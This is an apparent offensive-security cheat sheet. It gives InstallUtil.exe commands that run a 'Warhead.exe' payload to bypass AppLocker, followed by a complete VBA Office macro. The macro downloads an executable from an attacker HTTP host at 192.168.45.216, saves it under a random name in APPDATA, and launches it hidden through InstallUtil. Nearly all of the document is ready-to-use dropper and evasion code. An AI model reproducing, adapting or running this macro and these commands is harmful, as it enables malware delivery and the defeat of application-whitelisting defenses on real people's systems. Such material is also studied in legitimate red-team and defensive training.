## InstallUtil

```powershell
# Execute EXE (x64)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "Warhead.exe"

# Execute EXE (x86)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "Warhead.exe"
```
# Macro / VBA
Download from HTTP server, store on disk and execute with InstallUtil to bypass applocker
```vba
Sub DownloadAndExecute()
    Const ADTYPEBINARY = 1, ADSAVECREATEOVERWRITE = 2
    Dim xHttp As Object, bStrm As Object
    Dim filename As String, appDataPath As String, installUtilPath As String

    appDataPath = Environ("APPDATA")
    filename = appDataPath & "\" & GenerateRandomFilename() & ".exe"
    
    installUtilPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"

    Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xHttp.Open "GET", "http://192.168.45.216/IgnoreCLM.exe", False
    xHttp.send

    If xHttp.Status = 200 Then
        Set bStrm = CreateObject("ADODB.Stream")
        bStrm.Type = ADTYPEBINARY
        bStrm.Open
        bStrm.Write xHttp.responseBody
        bStrm.SaveToFile filename, ADSAVECREATEOVERWRITE
        bStrm.Close
    End If

    Set bStrm = Nothing
    Set xHttp = Nothing

    Shell installUtilPath & " /logfile= /LogToConsole=false /U """ & filename & """", vbHide
    
    Wait 10
End Sub

Function GenerateRandomFilename() As String
    Dim i As Integer, randomStr As String
    Randomize
    For i = 1 To 16
        randomStr = randomStr & Chr(Int((26 * Rnd) + 65))
    Next i
    GenerateRandomFilename = randomStr
End Function

Sub Wait(seconds As Long)
    Dim endTime As Date: endTime = DateAdd("s", seconds, Now)
    Do While Now < endTime: DoEvents: Loop
End Sub
```
## ToDo

- Add Unmanaged DLL Templates
